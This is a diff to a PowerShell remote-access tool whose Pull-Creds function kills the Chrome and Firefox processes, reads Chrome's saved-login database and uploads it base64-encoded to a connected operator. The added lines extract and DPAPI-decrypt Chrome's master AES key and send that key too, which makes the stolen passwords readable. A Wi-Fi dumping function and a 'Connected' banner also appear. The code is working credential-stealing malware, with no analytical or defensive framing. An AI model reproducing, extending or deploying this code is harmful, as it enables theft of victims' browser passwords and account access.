@@ -390,17 +390,17 @@ function PortSuggest {
 
     function Pull-Creds {
     try {
-        # Завершаем процессы браузеров
         Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
         Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 1
 
         $ip = (Test-Connection -ComputerName (hostname) -Count 1).Address.IPAddressToString
 
-        # Chrome
+        # === Chrome Paths ===
         $chromeData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         $chromeState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 
+        # === Upload Login Data ===
         if (Test-Path $chromeData) {
             $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeData))
             $out = "[UPLOAD]::chrome_LoginData_$ip.db::" + $b64Login + "::END"
@@ -409,15 +409,20 @@ function PortSuggest {
             $global:clientStream.Flush()
         }
 
+        # === Расшифровка и отправка AES-ключа ===
         if (Test-Path $chromeState) {
-            $b64State = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeState))
-            $out = "[UPLOAD]::chrome_LocalState_$ip.json::" + $b64State + "::END"
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
+            $localStateJson = Get-Content $chromeState -Raw | ConvertFrom-Json
+            $encKeyBase64 = $localStateJson.os_crypt.encrypted_key
+            $encKey = [Convert]::FromBase64String($encKeyBase64) | Select-Object -Skip 5
+            $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
+
+            $aesOut = "[UPLOAD]::chrome_master_key_$ip.bin::" + [Convert]::ToBase64String($aesKey) + "::END"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($aesOut)
             $global:clientStream.Write($bytes, 0, $bytes.Length)
             $global:clientStream.Flush()
         }
 
-        # Firefox
+        # === Firefox профили ===
         $firefoxRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
         if (Test-Path $firefoxRoot) {
             $profiles = Get-ChildItem $firefoxRoot -Directory -ErrorAction SilentlyContinue
@@ -440,6 +445,7 @@ function PortSuggest {
         return "[ERROR] pull-creds failed: $($_.Exception.Message)"
     }
 }
+
 
     
     function Dump-WiFi {
@@ -656,7 +662,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            dwdwdfwdwd                                                                                                                                                                    
+                                            NIS                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
